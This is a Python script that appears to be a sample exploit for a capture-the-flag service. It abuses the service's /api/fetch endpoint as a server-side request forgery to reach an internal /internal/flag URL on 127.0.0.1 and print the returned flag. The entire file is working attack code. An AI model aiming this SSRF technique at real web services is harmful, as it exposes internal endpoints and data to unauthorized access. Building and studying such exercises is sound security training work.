#!/usr/bin/env python3
import os
import re
import sys
import time
from urllib.parse import urlencode
from urllib.request import Request, urlopen


FLAG_RE = re.compile(r"FLAG\{[^}]+\}")


def _env(name: str) -> str:
    value = os.environ.get(name)
    if not value:
        raise RuntimeError(f"missing env {name}")
    return value


def _target_from_args_or_env() -> tuple[str, int, str]:
    if len(sys.argv) == 4:
        host = sys.argv[1]
        port = int(sys.argv[2])
        team_id = sys.argv[3]
        return host, port, team_id

    host = _env("TARGET_HOST")
    port = int(_env("TARGET_PORT"))
    team_id = _env("TARGET_TEAM_ID")
    return host, port, team_id


def main() -> int:
    try:
        host, port, team_id = _target_from_args_or_env()
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        print(
            f"Usage: {sys.argv[0]} <TARGET_HOST> <TARGET_PORT> <TARGET_TEAM_ID>",
            file=sys.stderr,
        )
        return 2

    base = f"http://{host}:{port}"
    # The service listens on 8000 inside its container; even if the externally reachable port differs,
    # the SSRF target remains the container-local listener.
    internal_url = f"http://127.0.0.1:8000/internal/flag?team_id={team_id}"

    url = f"{base}/api/fetch?{urlencode({'url': internal_url})}"

    try:
        req = Request(url, headers={"User-Agent": "sample-exp2/1.0"})
        with urlopen(req, timeout=5) as resp:
            body = resp.read()
    except Exception as exc:
        print(f"[!] request failed: {exc}", file=sys.stderr)
        return 1

    text = body.decode("utf-8", errors="replace").strip()
    m = FLAG_RE.search(text)
    if not m:
        print(text)
        return 3

    time.sleep(30)
    print(m.group(0))
    sys.stdout.flush()
    time.sleep(30)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
